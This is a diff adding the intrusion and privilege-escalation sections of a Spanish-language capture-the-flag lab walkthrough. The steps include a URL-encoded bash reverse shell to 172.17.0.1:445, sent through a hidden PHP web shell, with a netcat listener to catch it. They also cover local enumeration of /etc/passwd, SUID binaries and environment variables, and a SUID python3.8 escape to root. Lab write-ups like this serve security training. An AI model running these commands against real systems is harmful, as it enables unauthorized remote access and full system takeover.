@@ -156,6 +156,153 @@ ya podemos ejecutar desde la url comnandos
 
 ## FASE INTRUSIÓN
 
+Vamos a lanzarnos una reverse shell, primero identificamos nuestra IP.
+```bash
+ifconfig
+```
+En la interfaz "docker0" vemos que nuestra IP es:172.17.0.1
+
+Vamos a la página:
+```bash
+https://www.revshells.com/
+```
+y rellenamos los datos:
+IP: nuestra ip de atacante
+Puerto: por el que vamos a levantar el listener
+
+en la parte listener copiamos el comando, en mi caso:
+```bash
+sudo nc -lvnp 445
+```
+y tenemos levantado el listener a la espera de recibir la conexión
+
+y en la parte de la shell vemos:
+```bash
+sh -i >& /dev/tcp/172.17.0.1/445 0>&1
+```
+la vamos a ajustar un poco:
+```
+bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
+```
+y ahora la encodeamos en una pagina online quedando así
+```
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
+```
+
+vamos a la página web e incrustamos la revershell:
+
+```bash
+http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
+```
+
+## FASE ESCALADA DE PRIVILEGIOS
+
+Hacemos tratamiento de la TTY:
+```bash
+export TERM=xterm
+export SHELL=bash
+script /dev/null -c bash 
+^Z
+stty raw -echo; fg
+reset xterm
+stty rows 51 columns 237
+```
+Primero miro si estoy en algún grupo privilegiado:
+```bash
+id
+```
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+no es así, despues miro la variable de entrono, he llegado a ver contraseñas en texto claro:
+
+```bash
+printenv
+```
+```
+SHELL=bash
+PWD=/var/www/html/hidden
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+TERM=xterm
+APACHE_RUN_GROUP=www-data
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=3
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/printenv
+```
+ahora hago un cat al /etc/passwd para ver los usuarios:
+
+```bash
+cat /etc/passwd | grep sh$
+```
+```
+root:x:0:0:root:/root:/bin/bash
+rick:x:1000:1000::/home/rick:/bin/bash
+negan:x:1001:1001::/home/negan:/bin/bash
+```
+
+ahora vamos a mirar si tenemos algún privilegio sudo:
+
+```bash
+sudo -l
+```
+```
+[sudo] password for www-data:
+```
+Al pedirnos contraseña no podemos comprobarlo.
+Entonces me dirijo al home
+```bash
+cd home
+ls -la
+```
+```
+drwxr-xr-x 1 root     root     4096 Feb 11 23:56 .
+drwxr-xr-x 1 root     root     4096 Feb 21 19:25 ..
+drwxr-xr-x 2 negan    negan    4096 Feb 11 23:55 negan
+drwxr-xr-x 2 rick     rick     4096 Feb 11 23:55 rick
+drwxr-xr-x 2 www-data www-data 4096 Feb 11 23:56 wwdata
+drwxr-xr-x 2 www-data www-data 4096 Feb 11 23:56 www-data
+```
+y veo dos directorios de mi usuario y directorios del resto de usuarios en los que puedo entrar pero no hay nada
+antes de entrar en mis direcotios voy a buscar suid:
+```bash
+find / -perm -4000 2>/dev/null
+```
+```
+/usr/bin/chfn
+/usr/bin/man
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/python3.8
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+a simple vista veo man y python abusables, voy a la pagina:
+```bash
+https://gtfobins.github.io/
+```
+y busco el binario python, ya que el abuso del man es para poder leer archivos, lo tendremos en cuenta por si hay que leer algún archivo de root u otro usuario
+la página nos dice que en suid se abusa de esta manera:
+```
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+lo vamos a ajustar un poco quedndo así:
+```bash
+/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+lo ejecutamos y somos root.
+
 
 
 
